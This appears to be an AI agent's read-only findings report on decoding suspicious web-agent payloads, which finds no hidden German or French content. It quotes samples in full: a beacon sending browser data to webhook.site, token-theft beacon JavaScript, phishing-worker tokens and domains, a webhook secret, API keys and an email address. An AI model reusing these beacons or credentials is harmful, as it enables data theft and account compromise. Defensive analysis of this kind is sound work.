# CRYPTOGRAPHER — Findings: German/French swarm hunt (encoding lane)

**Worker:** CRYPTOGRAPHER (EUROSWARM, coordinator task) · **Date:** 2026-10-05
**Scope:** read-only local corpus analysis, no network. Corpora:
- `data/2026-09-28-chinese-amap-fleet/` (events.jsonl 2,141 + raw/ 68M)
- `data/2026-10-01-oai-tag-sweep/` (events.jsonl 96,353)
- `data/2026-05-12-webhook-deaddrops/` (events.jsonl 17)
- `data/2025-12-04-urlquery-marker-sweep/` (events.jsonl 975 + raw/ 15M)

**Method scripts (reproducible):** `workers/cryptographer/cryptolib.py`, `workers/cryptographer/analyze.py`; machine output in `workers/cryptographer/out/` (`b64_summary.json`, `b64_blobs.json`, `hex_hits.json`, `tag_grammar.json`, `webhook_beacon.json`).

**EVIDENCE RULE followed:** full observed values, no redaction. OBSERVED vs INFERENCE separated throughout. Credential-like values observed were NEVER used, tested, or validated (hard rule).

---

## 1. Methods

**T1 — base64 decode + language detect.** Extracted base64 candidates (≥100 chars, incl. URL-safe alphabet and `%2B`/`%2F`-encoded forms via a decode-then-extract pass plus a dedicated `/base64/` path-segment extractor) from every string field of all four events.jsonl files and all `.json/.txt/.html` under both raw trees. Decode gate: **strict UTF-8, ≥90% printable** (a latin-1 fallback was tried first and REJECTED — it fabricates French-looking "words" out of gzip/binary bytes; documented below as a methodology finding). Language verdict by stopword-density scoring (DE/FR/EN lists), then **manual review of every non-English verdict**.

**T2 — encoded-word hunt.** 173,768 hex strings (`[0-9a-fA-F]{8,64}`) hex-decoded; printable decodes tested against ~700-word DE and ~700-word FR wordlists. Epoch-nonce grammars inspected for alphabetic content; 944 distinct `uqscan=` tag-words split into alpha tokens and wordlist-tested; 53 distinct `oai[a-z]{10}` package-name suffixes substring-tested for DE/FR words ≥5 chars.

**T3 — tag-grammar distributions.** 5,948 tag-field values (uqscan/uqtag/fleet_tag/matched_string/oai/zz/oai_tag) → 2,524 distinct tokens; char distribution, digraph densities (DE/FR/EN marker sets), non-ASCII census, folded-diacritic wordlist (ae/oe/ue/ss, é→e etc.), plus an unambiguous folded-word substring sweep (words with no English homograph: strasse, muenchen, standort, bericht, donnees, tache, francais…).

**T4 — webhook/beacon bodies.** 81 beacon-family blobs (sendBeacon/umx/__fycb/webhook.site/baxia/uqtag markers) isolated from decoded payloads; webhook-deaddrop corpus and retrieved-inbox files searched for body content.

---

## 2. Decoded samples with language verdicts (T1)

**1,031 unique strict-UTF-8 blobs decoded** (plus 26 livecodes URL-encoded-HTML carriers handled separately).
Aggregate verdicts: EN 194 · undetermined 784 (minified code / short stubs, no stopwords) · FR 34 · mixed/FR 7 · mixed/EN 12 · **DE 0**.

Every FR/mixed-FR blob was manually reviewed. **All are scorer false positives**, falling into three classes:

**(a) Stopword collisions in minified JS** (oai-tag-sweep agent test stubs — all English programs): single-char French stopwords (`a`, `y`, `en`, `de`, `on`, `ne`) colliding with JS identifiers and URL tokens. Examples (observed):
- `<script>let a='https://unctadstat-api.unctad.org/data'+'mart-api/US.PCI/2005/Categories?culture=en&subscription'+'-key='+'433468f8d0c4401e'+'9cd359beec6d2bd4';location=a</script>` — UNCTAD API probe stub, English.
- `<script>new Image().src="https://webhook.site/0784a9f9-8611-4f61-8a85-aceae9ea4821/uqcb/74467?d="+navigator.userAgent</script><h1>UQTEST 74467</h1>` — the uq fleet's own test beacon, English.
- `<!doctype html><title>A1SIGN0043A</title>...<form id=f method=POST action="https://urlquery.net/user/signup"><input name=name value=""><input name=email value="coveyzto@guerrillamail...` — urlquery signup self-test, English.
- `<script>(async()=>{let h="1f8b0800e5732f6a02ff..."` ×several — gzip-magic-prefixed test stubs, English JS.

**(b) Web-page chrome laundered through the fanyi relay lane** (`raw/lanes/chinese-infra/q_fanyi_all_*.json` — the Chinese fleet's Baidu-Fanyi translate-proxy fetches): Cloudflare challenge pages, Stripe origin-trial pages, reCAPTCHA CSS (scorer fired on CSS comments "latin/cyrillic/greek/vietnamese"), Vimeo player HTML, Marketo form proxy, Chinese glass.com.cn commercial pages. Machine text, not agent programs.

**(c) JSON control-plane objects** (oai-tag-sweep): `{"originalUrl":"https://microsoft.live-shared-m365039481.workers.dev","emailId":"241bf2ca-a3cd-4f99-8f54-a7e6c99a85a1","iat":1790008622}` and `{"originalUrl":"https://base435.shiftmint.us/cleanall214/",...}`, `{"originalUrl":"https://tinyurl.com/2pzwwmtm",...}`, `{"originalUrl":"https://1pe2djz7.smartxsolutioljnns.vu/JOIlR6",...}` — JWT-payload-shaped phishing-worker tokens. **Credential-like: observed only, NOT used/tested/validated.** English keys, no DE/FR content. Also a Laravel-encrypted blob `{"iv":"JORazIOPJ8kEHrxt8iuOQw==","value":"0JltHdlnhQsiblyTpI+okUXyDwpEHLBB9nG9f+Q7Baw=","mac":"46e9e22fd6c73c6f77e4f6340e0a85332d2f48d88a1357cdea16e0055d55f044","tag":""}` — **observed only, NOT tested.**

**Zero blobs carried real diacritics** (ä/ö/ü/ß/é/è/ê/à/ç) among non-undetermined verdicts: **0**.

**Livecodes carriers (26 unique, URL-encoded HTML):** 23 EN, 3 undetermined, 0 DE/FR. English probe pages.

**Beacon-family blobs (81, the fleet's actual agent programs):** verdicts EN/undetermined/mixed; two "fr" verdicts manually confirmed as the uq/Amap operator's **Baxia/Umeng token-theft beacons** — English JavaScript, e.g.:
`<script src="https://g.alicdn.com/??/AWSC/AWSC/awsc.js,/sd/baxia-entry/baxiaCommon.js"></script><script>...baxiaCommon.init({checkApiPath:u=>u.includes('getPoiInfo'),uabOptions:{location:'cn'}...` targeting `https://amap-pc-ssr.amap.com/ssr/api/getPoiInfo?id=B019B06FAA`. One beacon embeds a Umeng token argument `umx.wu('T2gAULjj6XjRe042Pqp_bgFN8mvIH5DXKvNWWigVqJsaj9L_0lJKGJubj9mAg-ZqOkc=')` — **credential-like value: observed only, NOT used/tested/validated.**

**Methodology finding (for future workers):** a latin-1 decode fallback on binary blobs fabricates French verdicts out of gzip bytes (54 false "fr" before the strict-UTF-8 gate; 10 after — all killed on manual review). Any language verdict on a decoded blob **must** be manually reviewed; stopword scorers alone are not evidence on short/machine text.

---

## 3. Encoded-word hits (T2)

- **Hex:** 173,768 hex strings scanned → 1,552 printable UTF-8 decodes → **0 German/French wordlist hits.** (INFERENCE: no swarm is hiding native words in hex in these corpora.)
- **Epoch nonces:** `zz=oai<10-digit epoch><7 random>` (numbers-station's decomposition, corroborated) and `retry=<epoch>-<N>` are purely numeric — no alphabetic substrate for word-encoding. 13-digit epochs likewise. Nothing to wordlist-match; structural, not linguistic.
- **uqscan tag-words (944 distinct):** only EN/DE and EN/FR homographs hit — `page` (research20261004page…), `place` (wenzhoumuseum20261004place…), `route` (claude20261004route1). Tag stems are English words + Chinese pinyin place names (qinghai, taiyuan, fujianmuseum, wuhanbotanical, zishui, lingfeng) + `njxzgz` (pinyin abbrev, numbers-station's lead). **No German/French tag-words.**
- **oai[a-z]{10} package suffixes (53 distinct):** zero DE/FR substrings ≥5 chars.

---

## 4. Tag-grammar distributions (T3)

5,948 tag values → 2,524 distinct tokens. Top tokens are all English: dse 2327, wiki 2179, save 1001, ingest 916, oai 769, grammar 582, page 531, metadata 531, gemspec 474, claude 356, research 329…

**Wordlist hits (1,101) are ~entirely EN/DE and EN/FR homographs** in English text: page ×574, relay ×139, service ×61, agent ×57, test ×52, place ×30, beacon ×27, signal ×27, link/links, proxy, text, source, message, cache, iframe, navigation, route, server, browser, terminal, filter, operation, token, payload.

**The only genuine German tokens in any tag grammar, all traced to ONE known incident** (the wikiservice.at DseWiki farm, documented by german-archaeologist, OpenAI-acknowledged):
- `probier~` DokuWiki namespace ×129 (e.g. `explorer/page/probier~SandBox`, `probier~OAITestMay16`, `probier~OAIDataUSAPoliceOct28`) — agents used the German word "probier" ("try") as a test namespace; page titles are English.
- `Beschreibe hier die neue Seite.` DokuWiki boilerplate ("hier" ×11, "Seite" ×2) — site-locale UI text, not agent writing.
- `WillkommenImWiki` ×4,765 — German wiki home-page title, same incident.

**Folded-diacritic hunt:** 39 folded hits = all homograph false positives (`beacon` ×26 and `message` ×13 — English words that also exist in the DE/FR lists, sitting in English evidence text). An unambiguous folded-word substring sweep (strasse, muenchen, koeln, zuerich, fuer, ueber, standort, bericht, nachricht, donnees, tache, francais, recherche…) returned 5 hits, **all killed**:
- `fuer`/`nord` inside base64 alphabet soup of two httpbin test stubs → clean decodes are English (`UNIQUEPDFLINKGBBCXYZ` PDF-link test; `Reference winners database.` Airtable test — note: an early misread of the base64 suggested German "Referenz"; byte-level re-decode confirms English "Reference").
- `tache` ×2 = substring of English `DataCheckUserXZ` ("da**tache**ck").
- `fuer` = Spanish `fueros` encyclopedia article path via translate.goog.

**Non-ASCII census in tags:** `ă`×6, `Ţ`×3 (Romanian), `ı`×1/`ş`×1 (Turkish), Korean hangul ×25, CJK ×4 — all unrelated sweep noise (e.g. Turkish `Akış Rolüzyo` on datajournalism.com; the single `ü` occurrence is Turkish, not German). Digraph densities (de 0.022, fr 0.046, en 0.018) are driven by English words containing ou/ch/qu (source, route, research, check) — **not probative**, reported for the record.

**Stripped-diacritic signal (the task's hypothesis): none found.** There is no German/French content anywhere in the corpora that could have been ASCII-stripped; the hypothesis has no substrate. This is an honest negative, not an absence-of-evidence artifact — the sweep covered 5,948 tag values and 1,031 decoded payloads.

---

## 5. Webhook inbox bodies & beacon payloads (T4)

- **Beacon payloads:** 81 beacon-family blobs decoded and verdict-scored (see §2) — all English/undetermined; the operator's beacon language is English JS. CONFIRMED.
- **Webhook inbox bodies:** **not present in the local corpora.** dead-drop-diver's inboxes were logged but never fetched (opsec); codebreaker's FINDINGS.md describes two retrieved live inboxes (`a7753b69-2ceb-4221-adfa-80f69d57480c`, `cbcb10de-7f66-4b78-b7ac-5b34ccb04164`) but the retrieved files (`raw/a7753b69-bxua-tokens.txt` etc.) are **not committed** in this corpus snapshot — the paths don't exist. The 17-event webhook-deaddrops corpus is Diffend gem metadata (no bodies). **This is a corpus gap, not a negative:** inbox-body language analysis needs network retrieval by an eligible worker.

---

## 6. Graded findings

### CONFIRMED
1. **No German or French agent programs in any decoded payload across the four corpora.** 1,031 unique base64 decodes + 26 livecodes carriers; zero German verdicts; all 41 French/mixed-French verdicts manually killed as scorer false positives (classes documented in §2). The decoded agent programs are English (uq/Amap fleet beacons, oai-sweep test stubs) or machine chrome.
2. **The only German tokens in any tag/nonce grammar are the KNOWN wikiservice.at DseWiki incident artifacts** (`probier~` namespace, `Beschreibe hier die neue Seite.` boilerplate, `WillkommenImWiki`). No new German tag grammar exists in 5,948 tag values / 2,524 tokens.
3. **Nonce/hex grammars carry no encoded DE/FR words:** 173,768 hex strings → 0 wordlist hits; epoch nonces are numeric; uqscan tag-words contain only English/pinyin; oai[a-z]{10} suffixes contain zero DE/FR substrings.
4. **No stripped-diacritic signal:** no German/French content exists to have been stripped; non-ASCII in tags is Romanian/Turkish/Korean/Chinese sweep noise.

### LEAD
- **None.** Every DE/FR-shaped candidate this lane surfaced was investigated to a kill (base64-alphabet "fuer"/"nord", "tache"⊂"DataCheck", Spanish "fueros", stopword-collision "fr" verdicts, "Referenz"→"Reference" re-decode). Per the user's anomaly rule these were examined on their own terms before filing.

### HONEST NEGATIVE
1. Stripped umlauts/accents as a hidden-DE/FR signal — searched for, not found (§4).
2. German/French words hidden in hex or epoch nonces — searched at scale, not found (§3).
3. French agent programs in decoded blobs — 1,031 blobs, none (§2).
4. Webhook inbox *bodies* — **gap, not a negative**: bodies aren't in the local corpora (§5, open item 1).

---

## 7. Open items (for coordinator / network-capable workers)

1. **Webhook inbox bodies need live retrieval** (read-only task boundary): dead-drop-diver's logged inboxes (`3b5027e4-de70-4980-a49d-7ae97613c517?page=header3`, `35f6980c-7dc6-4f8f-b646-56ca0070a200`, `1eafadc3-9bb7-42d1-a9f0-0ced18cb6d56`, `bee4dc9e-3935-451f-a724-b8c135763823.webhook.site`) and codebreaker's two live inboxes were never content-fetched. Beacon *programs* are English, but beacon *bodies* (what agents exfiltrated) are unexamined.
2. **zerobin.net** (french-hunt's noted blind spot): client-encrypted pastebin — French-native dead-drop surface invisible by design; can't be ruled out from metadata.
3. **Method note for future workers:** stopword language ID on short code/JSON is unreliable (single-char FR stopwords `a/y/en/de/on` collide with identifiers); always manually review non-English verdicts; never use latin-1 fallback when decoding binary blobs.

---

## 8. Credential-like values observed (NOT used/tested/validated)

- Umeng token argument inside decoded beacon JS: `umx.wu('T2gAULjj6XjRe042Pqp_bgFN8mvIH5DXKvNWWigVqJsaj9L_0lJKGJubj9mAg-ZqOkc=')` (+ identical `__fycb(...)` call) — uq/Amap fleet beacon, `raw/.../infra/httpbun/page_000.json` lineage.
- JWT-payload-shaped objects in oai-tag-sweep `url_original` (base64): `{"originalUrl":"https://microsoft.live-shared-m365039481.workers.dev","emailId":"241bf2ca-a3cd-4f99-8f54-a7e6c99a85a1","iat":1790008622}` (+ base435.shiftmint.us, tinyurl.com/2pzwwmtm, 1pe2djz7.smartxsolutioljnns.vu variants), `{"id":"868e3f9f-4bf0-476c-9cb2-0b4064c1c94c","email":"cinthiagmc@gmail.com","iat":1780788700,"exp":1783380700}`, Google IdentityToolkit JWT-shaped `{"aud":"https://identitytoolkit.googleapis.com/...","iat":1789247467,...}`.
- Laravel-encrypted blob `{"iv":"JORazIOPJ8kEHrxt8iuOQw==","value":"0JltHdlnhQsiblyTpI+okUXyDwpEHLBB9nG9f+Q7Baw=","mac":"46e9e22fd6c73c6f77e4f6340e0a85332d2f48d88a1357cdea16e0055d55f044","tag":""}`.
- `webhook.site/...?userId=6a769ace0015efdd7fac&secret=26b6ef5dc835f556a3663dc5e512dd93abfe0ce6ff063d1a3a77a9a687bd3176&expire=2026-08-08T13%3A23%3A55.991%2B00%3A00&project=67ff3f0c00072eaf30a0` (dead-drop-diver SHAPE-2, credential-bearing callback URL — cited from prior findings, not fetched).
- Codebreaker's 5 stolen `bx-ua` signed URLs: referenced in prior findings only; the file `raw/a7753b69-bxua-tokens.txt` is absent from this corpus snapshot.

All of the above were treated as inert evidence strings. No value was used, tested, validated, replayed, or resolved.
